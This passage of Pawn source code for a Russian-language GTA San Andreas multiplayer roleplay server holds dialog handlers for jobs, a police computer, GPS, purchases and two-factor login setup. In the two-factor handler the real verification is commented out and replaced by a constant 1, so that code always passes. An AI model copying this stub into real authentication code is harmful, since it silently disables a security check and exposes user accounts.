						if(IsValidDynamicObject(GetPVarInt(playerid,"PovarObject"))) DestroyDynamicObject(GetPVarInt(playerid,"PovarObject")),DeletePVar(playerid,"PovarObject");
						DeletePVar(playerid,"PovarEda");
					}
		            SetPVarInt(playerid,"Povar",1);
		            SetPVarInt(playerid,"PovarC",0);
		            SetPVarInt(playerid,"PovarW",1);
 					ApplyDynamicActorAnimation(PovarBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(PovarText,-1,"Держи форму и быстро за работу!");
					SetTimerEx("ClearBotGlobalClear", 3000, false,"dd",PovarBot,_:PovarText);
		            SendClientMessage(playerid,CGREEN,"Вы начали работу повара. Ваша задача готовить блюда.");
					SetPlayerZakaz(playerid);
		       //     if(PlayerInfo[playerid][pSex] == 1) SetPlayerSkin(playerid,209);
		         //   else SetPlayerSkin(playerid,205);
		        }
		        case 1:
		        {
           			static const fmt_string1[] = "Вы закончили работу повара. Вы изготовили %i блюд(о) и заработали $%i";
					new str1[sizeof(fmt_string1)+4+4];
					format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"PovarC"),GetPVarInt(playerid,"PovarM"));
					SendClientMessage(playerid,CGREEN,str1);
					GiveMoney(playerid,GetPVarInt(playerid,"PovarM"));
					if(!PlayerInfo[playerid][pQuestS][1])
					{
						PlayerQuest[playerid][1][3] += GetPVarInt(playerid,"PovarC");
						CheckQuest(playerid,1);
					}
     				DeletePVar(playerid,"Povar");
		            DeletePVar(playerid,"PovarW");
		            DisablePlayerCheckpoint(playerid);
					SetPlayerSpecialAction(playerid,0);
					if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
					static const fmt_str1[] = "Хорошая работа. Держи свои $%i";
					new string1[sizeof(fmt_str1)+10];
					format(string1, sizeof(string1), fmt_str1, GetPVarInt(playerid,"PovarM"));
					ApplyDynamicActorAnimation(PovarBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(PovarText,-1,string1);
					SetTimerEx("ClearBotGlobalClear", 3000, false,"dd",PovarBot,_:PovarText);
     				DeletePVar(playerid,"PovarC");
     				DeletePVar(playerid,"PovarM");
     				DeletePVar(playerid,"PovarEda");
				//	SetSkin(playerid);
					CheckJobHelp(playerid);
		        }
		    }
		}
		case 251:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0:
				{
					query = "";
					strcat(query,"{FFFFFF}");
					static textpost[][] = {"Шоссе Las Venturas - Fort Carson","Мост Fort Carson - Bayside","Дамба","Мост Los Santos - Las Venturas","Мост Los Santos - San Fierro"};
					
	
					static const fmt_string[] = "%s занимает пост №%d (%s)\n";
					new str[sizeof(fmt_string)+2+MAX_PLAYER_NAME+4+2+32+10];
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || !GetPVarInt(i,"ThisPost")) continue;
						
						format(str, sizeof(str), fmt_string,PlayerInfo[i][pSendername],GetPVarInt(i,"ThisPost"),textpost[GetPVarInt(i,"ThisPost")-1]);
						strcat(query,str);
					}
					ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Информация о постах",query,"Отмена","");
				}
				case 1: ShowPlayerDialog(playerid,253,DIALOG_STYLE_INPUT,"Снять с розыска","{FFFFFF}Введите имя и фамилью человека, с которого хотите снять розыск.\nВ форме: Имя_Фамилия\nПример: Ivan_Ivanov","Далее","Назад");
				case 2:
				{
				    query = "";
					new str[50];
				    for(new i = 1; i <= TOTALRADAR; i++)
				    {
				        format(str,sizeof(str),"%d | %s\n",i,RadarInfo[i][rName]);
				        strcat(query,str);
				    }
				    ShowPlayerDialog(playerid,477,DIALOG_STYLE_LIST,"Камеры",query,"Далее","Отмена");
				}
				/*{
    				gSatellite[0] = TextDrawCreate(-3.5000, -15.5555, "LD_SPAC:white"); // ?????
				    TextDrawTextSize(gSatellite[0], 656.0000, 560.0000);
				    TextDrawAlignment(gSatellite[0], 1);
				    TextDrawColor(gSatellite[0], 303174399);
				    TextDrawBackgroundColor(gSatellite[0], 255);
				    TextDrawFont(gSatellite[0], 4);
				    TextDrawSetProportional(gSatellite[0], 0);
				    TextDrawSetShadow(gSatellite[0], 0);

				    gSatellite[1] = TextDrawCreate(316.0000, 170.7110, "LOADING"); // ????????
				    TextDrawLetterSize(gSatellite[1], 0.6480, 2.9439);
				    TextDrawAlignment(gSatellite[1], 2);
				    TextDrawColor(gSatellite[1], -1);
				    TextDrawBackgroundColor(gSatellite[1], 255);
				    TextDrawFont(gSatellite[1], 2);
				    TextDrawSetProportional(gSatellite[1], 1);
				    TextDrawSetShadow(gSatellite[1], 0);

				    gSatellite[2] = TextDrawCreate(230.6000, 221.1452, "LOG:"); // ?????????? ? ????????
				    TextDrawLetterSize(gSatellite[2], 0.3834, 2.0417);
				    TextDrawAlignment(gSatellite[2], 2);
				    TextDrawColor(gSatellite[2], -1);
				    TextDrawBackgroundColor(gSatellite[2], 255);
				    TextDrawFont(gSatellite[2], 2);
				    TextDrawSetProportional(gSatellite[2], 1);
				    TextDrawSetShadow(gSatellite[2], 0);

				    gSatellite[3] = TextDrawCreate(315.1000, 303.0075, "please wait for download..."); // ??????????, ????????? ?????? ????????
				    TextDrawLetterSize(gSatellite[3], 0.2089, 1.1022);
				    TextDrawAlignment(gSatellite[3], 2);
				    TextDrawColor(gSatellite[3], -1);
				    TextDrawBackgroundColor(gSatellite[3], 255);
				    TextDrawFont(gSatellite[3], 2);
				    TextDrawSetProportional(gSatellite[3], 1);
				    TextDrawSetShadow(gSatellite[3], 0);

				    gSatellite[5] = TextDrawCreate(250.0000, 201.0444, "LD_SPAC:white"); // ?????
				    TextDrawTextSize(gSatellite[5], 3.0000, 35.0000);
				    TextDrawAlignment(gSatellite[5], 1);
				    TextDrawColor(gSatellite[5], 303174399);
				    TextDrawBackgroundColor(gSatellite[5], 255);
				    TextDrawFont(gSatellite[5], 4);
				    TextDrawSetProportional(gSatellite[5], 0);
				    TextDrawSetShadow(gSatellite[5], 0);

				    gSatellite[6] = TextDrawCreate(293.0000, 199.7999, "LD_SPAC:white"); // ?????
				    TextDrawTextSize(gSatellite[6], 3.0000, 35.0000);
				    TextDrawAlignment(gSatellite[6], 1);
				    TextDrawColor(gSatellite[6], 303174399);
				    TextDrawBackgroundColor(gSatellite[6], 255);
				    TextDrawFont(gSatellite[6], 4);
				    TextDrawSetProportional(gSatellite[6], 0);
				    TextDrawSetShadow(gSatellite[6], 0);

				    gSatellite[7] = TextDrawCreate(333.0000, 202.9110, "LD_SPAC:white"); // ?????
				    TextDrawTextSize(gSatellite[7], 3.0000, 35.0000);
				    TextDrawAlignment(gSatellite[7], 1);
				    TextDrawColor(gSatellite[7], 303174399);
				    TextDrawBackgroundColor(gSatellite[7], 255);
				    TextDrawFont(gSatellite[7], 4);
				    TextDrawSetProportional(gSatellite[7], 0);
				    TextDrawSetShadow(gSatellite[7], 0);

				    gSatellite[8] = TextDrawCreate(373.5000, 202.9110, "LD_SPAC:white"); // ?????
				    TextDrawTextSize(gSatellite[8], 3.0000, 35.0000);
				    TextDrawAlignment(gSatellite[8], 1);
				    TextDrawColor(gSatellite[8], 303174399);
				    TextDrawBackgroundColor(gSatellite[8], 255);
				    TextDrawFont(gSatellite[8], 4);
				    TextDrawSetProportional(gSatellite[8], 0);
				    TextDrawSetShadow(gSatellite[8], 0);

				    gSatellite[4] = TextDrawCreate(213.0000, 204.1336, "LD_SPAC:white"); // ?????
				    TextDrawTextSize(gSatellite[4], 202.0000, 10.0000);
				    TextDrawAlignment(gSatellite[4], 1);
				    TextDrawColor(gSatellite[4], 404232447);
				    TextDrawBackgroundColor(gSatellite[4], 255);
				    TextDrawFont(gSatellite[4], 4);
				    TextDrawSetProportional(gSatellite[4], 0);
				    TextDrawSetShadow(gSatellite[4], 0);


				    pSatellite[playerid][0] = CreatePlayerTextDraw(playerid, 213.5999, 241.1003, "~y~CHECK.. ~w~system startup..."); // ?????? ???????
				    PlayerTextDrawLetterSize(playerid, pSatellite[playerid][0], 0.2074, 1.0399);
				    PlayerTextDrawAlignment(playerid, pSatellite[playerid][0], 1);
				    PlayerTextDrawColor(playerid, pSatellite[playerid][0], -1);
				    PlayerTextDrawBackgroundColor(playerid, pSatellite[playerid][0], 255);
				    PlayerTextDrawFont(playerid, pSatellite[playerid][0], 2);
				    PlayerTextDrawSetProportional(playerid, pSatellite[playerid][0], 1);
				    PlayerTextDrawSetShadow(playerid, pSatellite[playerid][0], 0);

				    pSatellite[playerid][1] = CreatePlayerTextDraw(playerid, 213.1999, 250.6009, "~y~CHECK..~w~ the connection to the cameras..."); // ??????????? ? ???????
				    PlayerTextDrawLetterSize(playerid, pSatellite[playerid][1], 0.2074, 1.0399);
				    PlayerTextDrawAlignment(playerid, pSatellite[playerid][1], 1);
				    PlayerTextDrawColor(playerid, pSatellite[playerid][1], -1);
				    PlayerTextDrawBackgroundColor(playerid, pSatellite[playerid][1], 255);
				    PlayerTextDrawFont(playerid, pSatellite[playerid][1], 2);
				    PlayerTextDrawSetProportional(playerid, pSatellite[playerid][1], 1);
				    PlayerTextDrawSetShadow(playerid, pSatellite[playerid][1], 0);

				    pSatellite[playerid][2] = CreatePlayerTextDraw(playerid, 213.0999, 259.9014, "~y~CHECK..~w~ connection check..."); // ???????? ??????????
				    PlayerTextDrawLetterSize(playerid, pSatellite[playerid][2], 0.2074, 1.0399);
				    PlayerTextDrawAlignment(playerid, pSatellite[playerid][2], 1);
				    PlayerTextDrawColor(playerid, pSatellite[playerid][2], -1);
				    PlayerTextDrawBackgroundColor(playerid, pSatellite[playerid][2], 255);
				    PlayerTextDrawFont(playerid, pSatellite[playerid][2], 2);
				    PlayerTextDrawSetProportional(playerid, pSatellite[playerid][2], 1);
				    PlayerTextDrawSetShadow(playerid, pSatellite[playerid][2], 0);

				    pSatellite[playerid][3] = CreatePlayerTextDraw(playerid, 213.5999, 269.4020, "~y~CHECK..~w~ loading the interface..."); // ???????? ??????????
				    PlayerTextDrawLetterSize(playerid, pSatellite[playerid][3], 0.2074, 1.0399);
				    PlayerTextDrawAlignment(playerid, pSatellite[playerid][3], 1);
				    PlayerTextDrawColor(playerid, pSatellite[playerid][3], -1);
				    PlayerTextDrawBackgroundColor(playerid, pSatellite[playerid][3], 255);
				    PlayerTextDrawFont(playerid, pSatellite[playerid][3], 2);
				    PlayerTextDrawSetProportional(playerid, pSatellite[playerid][3], 1);
				    PlayerTextDrawSetShadow(playerid, pSatellite[playerid][3], 0);

				    pSatellite[playerid][4] = CreatePlayerTextDraw(playerid, 213.0000, 204.1336, "LD_SPAC:white"); // ???????? ???
				    PlayerTextDrawTextSize(playerid, pSatellite[playerid][4], 0.0000, 10.0000);
				    PlayerTextDrawAlignment(playerid, pSatellite[playerid][4], 1);
				    PlayerTextDrawColor(playerid, pSatellite[playerid][4], 606348543);
				    PlayerTextDrawBackgroundColor(playerid, pSatellite[playerid][4], 255);
				    PlayerTextDrawFont(playerid, pSatellite[playerid][4], 4);
				    PlayerTextDrawSetProportional(playerid, pSatellite[playerid][4], 0);
				    PlayerTextDrawSetShadow(playerid, pSatellite[playerid][4], 0);

				    for(new gSL; gSL < 9; gSL++) TextDrawShowForPlayer(playerid, gSatellite[gSL]);
				    for(new pSL; pSL < 5; pSL++) PlayerTextDrawShow(playerid, pSatellite[playerid][pSL]);
					SetPVarInt(playerid,"CameraC",5);
					TogglePlayerControllable(playerid, 0);
					
					
					
				}*/
		    }
		}
		case 252:
		{
		    if(!response) return ShowPlayerDialog(playerid,251,DIALOG_STYLE_LIST,"Компьютер","Информация о постах\nСнять с розыска","Далее","Отмена");
			
		}

		case 253:
		{
		    if(!response) return 1;
		    new nick[MAX_PLAYER_NAME];
		    if(sscanf(inputtext,"s[24]",nick)) return ShowPlayerDialog(playerid,253,DIALOG_STYLE_INPUT,"Снять с розыска","{FFFFFF}Введите имя и фамилью человека, с которого хотите снять розыск.\nВ форме: Имя_Фамилия\nПример: Ivan_Ivanov","Далее","Назад");
		    if(PlayerLogged[GetPlayerID(nick)] == false || PlayerInfo[GetPlayerID(nick)][pWanted] == 0) return SendClientMessage(playerid,CGREY,"Вы не верно ввели имя и фамилию, либо человек не в розыске");
		    SetPVarInt(playerid,"IDSU",GetPlayerID(nick));
			static const fmt_str1[] = "{FFFFFF}Имя Фамилия: %s\nУровень розыск: %i\nПричина розыска: %s\n\nВы действительно хотите снять с данного человека розыск за 200$?";
			new string1[sizeof(fmt_str1)+24+2+20-2*3];
			format(string1, sizeof(string1), fmt_str1, PlayerInfo[GetPlayerID(nick)][pSendername],PlayerInfo[GetPlayerID(nick)][pWanted],PlayerInfo[GetPlayerID(nick)][pSuAd]);
			ShowPlayerDialog(playerid,254,DIALOG_STYLE_MSGBOX,"Снять с розыска",string1,"Далее","Отмена");
		}
		case 254:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"IDSU");
		        return ShowPlayerDialog(playerid,251,DIALOG_STYLE_LIST,"Компьютер","Камеры\nСнять с розыска","Далее","Отмена");
		    }
		    new id1 = GetPVarInt(playerid,"IDSU");
		    if(PlayerLogged[id1] == false || PlayerInfo[id1][pWanted] == 0) return SendClientMessage(playerid,CGREY,"Вы не верно ввели имя и фамилию, либо человек не в розыске");
 	   		static const fmt_string1[] = "[R] %s | %s снял с розыска %s";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+32-2*3];
			format(str1, sizeof(str1), fmt_string1,FracInfo[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pSendername],PlayerInfo[id1][pSendername]);
			SendCopsMessage(str1);
			//GiveMoney(playerid,-200);
			PlayerInfo[id1][pWanted] = 0;
			SetPlayerWantedLevel(id1,0);
			SendClientMessage(playerid,CYELLOW,"Вас сняли с розыска!");
			strmid(PlayerInfo[id1][pSuAd], "None", 0, strlen("None"), 20);
            DeletePVar(playerid,"IDSU");
		}
		case 255:
		{
		    if(!response) return cmd_menu(playerid,"");
		    switch(listitem)
		    {
		        case 0:
		        {
		            PlayerInfo[playerid][pFight] = FIGHT_STYLE_NORMAL;
		            SetPlayerFightingStyle (playerid, FIGHT_STYLE_NORMAL);
		        }
		        case 1:
		        {
		            if(PlayerInfo[playerid][pSkillT] < 3) return SendClientMessage(playerid,CGREY,"Недостаточный уровень силовой подготовки. Повысить её можно в спортзале (/gps » Основное » Спортзал)");
		            PlayerInfo[playerid][pFight] = FIGHT_STYLE_BOXING;
		            SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING);
		        }
		        case 2:
		        {
		            if(PlayerInfo[playerid][pSkillT] < 5) return SendClientMessage(playerid,CGREY,"Недостаточный уровень силовой подготовки. Повысить её можно в спортзале (/gps » Основное » Спортзал)");
		            PlayerInfo[playerid][pFight] = FIGHT_STYLE_KUNGFU;
		            SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU);
		        }
		        case 3:
		        {
		            if(PlayerInfo[playerid][pSkillT] < 7) return SendClientMessage(playerid,CGREY,"Недостаточный уровень силовой подготовки. Повысить её можно в спортзале (/gps » Основное » Спортзал)");
		            PlayerInfo[playerid][pFight] = FIGHT_STYLE_KNEEHEAD;
		            SetPlayerFightingStyle (playerid, FIGHT_STYLE_KNEEHEAD);
		        }
		    }
		    ShowFight(playerid);
		}
		case 256:
		{
		    if(!response) return true;
		    switch(GetPVarInt(playerid,"Medic"))
		    {
		        case 0:
		        {
		            SetPVarInt(playerid,"Medic",1);
		            SetPVarInt(playerid,"MedicC",0);
		            SetPVarInt(playerid,"MedicW",1);
 					ApplyDynamicActorAnimation(MedicBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(MedicText,-1,"Держи форму и быстро за работу!");
					SetTimerEx("ClearBotGlobalClear", 3000, false,"dd",MedicBot,_:MedicText);
		            SendClientMessage(playerid,CGREEN,"Вы начали работу сборщика аптечек. Ваша задача собрать аптечки и относить на склад.");
                    SendClientMessage(playerid,CGREEN,"Для начала возьмите заготовки на жёлтом пикапе.");
		        }
		        case 1:
		        {
           			static const fmt_string1[] = "Вы закончили работу сборщика аптечек. Вы перенесли %i аптечку(ек)  и заработали $%i";
					new str1[sizeof(fmt_string1)+4+4];
					format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"MedicC"),GetPVarInt(playerid,"MedicC")*2);
					SendClientMessage(playerid,CGREEN,str1);
					GiveMoney(playerid,GetPVarInt(playerid,"MedicC")*80);
					if(!PlayerInfo[playerid][pQuestS][1])
					{
						PlayerQuest[playerid][1][1] += GetPVarInt(playerid,"MedicC");
						CheckQuest(playerid,1);
					}
		            DisablePlayerCheckpoint(playerid);
					SetPlayerSpecialAction(playerid,0);
					if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
					if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2);
					static const fmt_str1[] = "Хорошая работа. Держи свои $%i";
					new string1[sizeof(fmt_str1)+10];
					format(string1, sizeof(string1), fmt_str1, GetPVarInt(playerid,"MedicC")*2);
					ApplyDynamicActorAnimation(MedicBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(MedicText,-1,string1);
					SetTimerEx("ClearBotGlobalClear", 3000, false,"dd",MedicBot,_:MedicText);
     				DeletePVar(playerid,"Medic");
     				DeletePVar(playerid,"MedicC");
		            DeletePVar(playerid,"MedicW");
		            CheckJobHelp(playerid);
		        }
		    }
		}
		case 259:
		{
		    if(!response) return true;
		    if(PlayerInfo[playerid][pCash] < 5) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			if(PlayerInfo[playerid][pRolik] != 0) return SendClientMessage(playerid,CGREY,"Вы уже арендуете ролики");
			PlayerInfo[playerid][pRolik] = gettime() + 60*15;
			GiveMoney(playerid,-5);
			if(PlayerInfo[playerid][pSex] == 1) SetPlayerSkin(playerid,99);
			else SetPlayerSkin(playerid,92);
			SendClientMessage(playerid,-1,"Вы арендовали ролики на 15 минут. Если вы захотите снять их раньше, то подойдите к арендодателю.");
			ApplyDynamicActorAnimation(RolikBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			if(random(2) > 0) Update3DTextLabelTextEx(RolikText,-1,"Только не упадите");
			else Update3DTextLabelTextEx(RolikText,-1,"Отличная погода для катания");
			SetTimerEx("ClearBotGlobal", 3000, false,"dd",RolikBot,_:RolikText);
		}
		case 260:
		{
		    if(!response) return cmd_gps(playerid,"");
		    switch(listitem)
            {
		    	case 0: SetPlayerRaceCheckpoint(playerid,2,969.7739,2361.3352,10.8410,0,0,0,10);
		    	case 1,2: SetPlayerRaceCheckpoint(playerid,2,1629.2667,972.0903,10.8203,0,0,0,10);
		    	
		    }
		    SetPVarInt(playerid,"GPS",1);
		}
		case 261:
		{
		    if(!response) return cmd_tp(playerid,"");
		    switch(listitem)
            {
		    	case 0: SetPlayerPos(playerid,967.7739,2362.3352,10.8410);
		    	case 1,2: SetPlayerPos(playerid,1629.2667,972.0903,10.8203);
		    }
		}
		case 262:
		{
		    if(!response) return cmd_gps(playerid,"");
		    new idbiz,Float:bizfloat;
		    switch(listitem)
		    {
		        case 0:
		        {
	                for(new i = 0; i <= TOTALBIZ; i++)
	                {
	                    if(BizInfo[i][bType] != 2) continue;
	                    if(GetPlayerDistanceFromPoint(playerid,BizInfo[i][bX],BizInfo[i][bY],BizInfo[i][bZ]) < bizfloat || bizfloat == 0)
	                    {
	                        idbiz = i;
	                        bizfloat = GetPlayerDistanceFromPoint(playerid,BizInfo[i][bX],BizInfo[i][bY],BizInfo[i][bZ]);
	                    }
	                }
	                SetPlayerRaceCheckpoint(playerid,2,BizInfo[idbiz][bX],BizInfo[idbiz][bY],BizInfo[idbiz][bZ],0,0,0,10);
		        }
		        case 1:
		        {
          			for(new i = 0; i <= TOTALBIZ; i++)
	                {
	                    if(BizInfo[i][bType] != 10) continue;
	                    if(GetPlayerDistanceFromPoint(playerid,BizInfo[i][bX],BizInfo[i][bY],BizInfo[i][bZ]) < bizfloat || bizfloat == 0)
	                    {
	                        idbiz = i;
	                        bizfloat = GetPlayerDistanceFromPoint(playerid,BizInfo[i][bX],BizInfo[i][bY],BizInfo[i][bZ]);
	                    }
	                }
	                SetPlayerRaceCheckpoint(playerid,2,BizInfo[idbiz][bX],BizInfo[idbiz][bY],BizInfo[idbiz][bZ],0,0,0,10);
		        }
		        case 2:
		        {
		            for(new i = 0; i <= TOTALBIZ; i++)
	                {
	                    if(BizInfo[i][bType] == 8 || BizInfo[i][bType] == 3 || BizInfo[i][bType] == 4)
	                    {
		                    if(GetPlayerDistanceFromPoint(playerid,BizInfo[i][bX],BizInfo[i][bY],BizInfo[i][bZ]) < bizfloat || bizfloat == 0)
		                    {
		                        idbiz = i;
		                        bizfloat = GetPlayerDistanceFromPoint(playerid,BizInfo[i][bX],BizInfo[i][bY],BizInfo[i][bZ]);
		                    }
	                    }
	                }
	                SetPlayerRaceCheckpoint(playerid,2,BizInfo[idbiz][bX],BizInfo[idbiz][bY],BizInfo[idbiz][bZ],0,0,0,10);
		        }
		        case 3:
		        {
		            for(new i = 1; i <= TOTALBANK; i++)
	                {
	                    if(GetPlayerDistanceFromPoint(playerid,BankInfo[i][bX],BankInfo[i][bY],BankInfo[i][bZ]) < bizfloat || bizfloat == 0)
	                    {
	                        idbiz = i;
	                        bizfloat = GetPlayerDistanceFromPoint(playerid,BankInfo[i][bX],BankInfo[i][bY],BankInfo[i][bZ]);
	                    }
	                }
	                SetPlayerRaceCheckpoint(playerid,2,BankInfo[idbiz][bX],BankInfo[idbiz][bY],BankInfo[idbiz][bZ],0,0,0,10);
		        }
		        case 4:
		        {
		            for(new i = 0; i <= TOTALBIZ; i++)
	                {
	                    if(BizInfo[i][bType] != 12 && BizInfo[i][bType] != 13 ) continue;
	                    if(GetPlayerDistanceFromPoint(playerid,BizInfo[i][bX],BizInfo[i][bY],BizInfo[i][bZ]) < bizfloat || bizfloat == 0)
	                    {
	                        idbiz = i;
	                        bizfloat = GetPlayerDistanceFromPoint(playerid,BizInfo[i][bX],BizInfo[i][bY],BizInfo[i][bZ]);
	                    }
	                }
	                SetPlayerRaceCheckpoint(playerid,2,BizInfo[idbiz][bX],BizInfo[idbiz][bY],BizInfo[idbiz][bZ],0,0,0,10);
		        }
		    }
		    SetPVarInt(playerid,"GPS",1);
		}
		case 263:
		{
		    if(!response) return true;
		    new codea[17];
			for(new i = 0; i < 17; i ++) strcat(codea, biglet1ters[random(sizeof(biglet1ters))]);
			SendClientMessage(playerid,-1,codea);
            static const fmt_string[] = "{FFFFFF}Запустите приложение Google Authenticator на своем смартфоне.\nВам нужно вручную ввести новый ключ.\n\nВ поле 'Аккаунт' введите: {f7ae11}%s{FFFFFF}\nВ поле 'Ключ' введите: {f7ae11}%s{FFFFFF} (Для удобства в копировании, код написан в чате)\nВыберите пункт {f7ae11}'По времени'.";
			new str1[sizeof(fmt_string)+24+16-2*2];
			format(str1, sizeof(str1), fmt_string,PlayerInfo[playerid][pSendername],codea);
			ShowPlayerDialog(playerid,264,DIALOG_STYLE_MSGBOX,"Двухэтапная авторизация",str1,"Далее","Назад");
			SetPVarString(playerid,"Code",codea);
			//ShowPlayerDialog(playerid,264,"Введите код","{FFFFFF}Введите код, показанный Вам в приложении:\n\n","Далее","Назад");
		}
		case 264:
		{
		    if(!response)
		    {
		        if(PlayerLogged[playerid]) return true;
		        else return Kick(playerid, FIX_FUNCTION, 1200);
		    }
		    ShowPlayerDialog(playerid,265,DIALOG_STYLE_INPUT,"Введите код","{FFFFFF}Введите код, показанный Вам в приложении:\n\n","Далее","Назад");
		}
		case 265:
		{
		    if(!response) 
		    {
		        if(PlayerLogged[playerid]) return true;
		        else return Kick(playerid, FIX_FUNCTION, 1200);
		    }
		    new nick;
		    if(sscanf(inputtext,"i",nick)) return ShowPlayerDialog(playerid,265,DIALOG_STYLE_INPUT,"Введите код","{FFFFFF}Введите код, показанный Вам в приложении:\n\n","Далее","Назад");
		    new code2[17];
			GetPVarString(playerid, "Code", code2, sizeof(code2));
			new heh = 1; //GoogleAuthenticatorCode(code2, gettime());
		    if(nick != heh)
			{
			    ShowPlayerDialog(playerid,264,DIALOG_STYLE_INPUT,"Введите код","{FFFFFF}Введите код, показанный Вам в приложении:\n\n","Далее","Назад");
			    if(GetPVarInt(playerid,"OpaKick") < 3) SetPVarInt(playerid,"OpaKick",GetPVarInt(playerid,"OpaKick")+1);
			    else Kick(playerid, FIX_FUNCTION, 1200);
				return SendClientMessage(playerid,CLIGHTRED,"Код не совпадает");
			}
		    else 
		    {
		        if(PlayerLogged[playerid])
		        {
			        if(!PlayerInfo[playerid][pGA])
			        {
			            SendClientMessage(playerid,CLIGHTRED,"Вы включили двухэтапную авторизацию");
			            PlayerInfo[playerid][pGA] = 1;
			            query = "";
						format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Включил Google Authenticator','%d')",PlayerInfo[playerid][pID],gettime());
						mysql_tquery(mysql,query);
			        }
			        else
			        {
			            SendClientMessage(playerid,CLIGHTRED,"Вы выключили двухэтапную авторизацию");
			            PlayerInfo[playerid][pGA] = 0;
			            query = "";
						format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Выключил Google Authenticator','%d')",PlayerInfo[playerid][pID],gettime());
						mysql_tquery(mysql,query);
			        }
				}
				else
				{
				    if(!strval(GetAccount(PlayerInfo[playerid][pSendername], "pin1")))
				    {
					    new ipStr[16];
						GetPlayerIp( playerid, ipStr, 16 );
						if(PlayerInfo[playerid][pAdmin] && PlayerInfo[playerid][pAdmin] < 6)
				        {
				            new sas[2] = 0;
							
							new podIP[2],podIPREG[2],podIPs[2],d;
							sscanf(ipStr,"p<.>dddd",podIPs[0],podIPs[1],d,d);
							sscanf(PlayerInfo[playerid][pIp],"p<.>dddd",podIP[0],podIP[1],d,d);
							sscanf(PlayerInfo[playerid][pIpReg],"p<.>dddd",podIPREG[0],podIPREG[1],d,d);
							
							
							if(podIPs[0] != podIP[0] && podIPs[1] != podIP[1]) sas[0] = 1;
							if(podIPs[0] != podIPREG[0] && podIPs[0] != podIPREG[1]) sas[1] = 1;
						    static const fmt_stri1ng[] = "[A] %s: С последнего захода: %s{FFFF00} | С регистрации: %s";
							new stri1ng[sizeof(fmt_stri1ng)+70-4+24];
							format(stri1ng, sizeof(stri1ng),fmt_stri1ng,PlayerInfo[playerid][pSendername],(sas[0]) ? ("{D50000}[Подозрение на взлом]"):("{FFFFFF}[Подсеть совпала]"),(sas[1]) ? ("{D50000}[Подозрение на взлом]"):("{FFFFFF}[Подсеть совпала]"));
						    SendAdminMessage(CYELLOW, stri1ng);
				        }
						SetPlayerStr(PlayerInfo[playerid][pSendername],"ip",ipStr);
					}
					OnPlayerLogin(playerid);
				}
		    }
		}
		case 266:
		{
		    if(!response) return GoLoad(playerid);
		    SetPVarInt(playerid,"GoPos",2);
		    GoLoad(playerid);
		}
		case 267:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd"))
		    {
		        SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
			if(!GetPVarInt(playerid,"Oplata"))
      		{
				if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			PlayerInfo[playerid][pShash] = 1;
			if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
			else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
			
   			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
			SendClientMessage(playerid,CREWARD,"Вы приобрели шашку 'Такси'. Используйте: /taxi.");
			GiveInv(playerid,446,1);
   			DeletePVar(playerid,"AmmoGun");
      		DeletePVar(playerid,"AmmoPrice");
		}
		case 268:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0: ShowPlayerDialog(playerid,130,DIALOG_STYLE_INPUT,"Цвет","{FFFFFF}Введите желаемый цвет авто через запятую\nПример: 3,3","Далее","Назад");
		        case 1:
				{
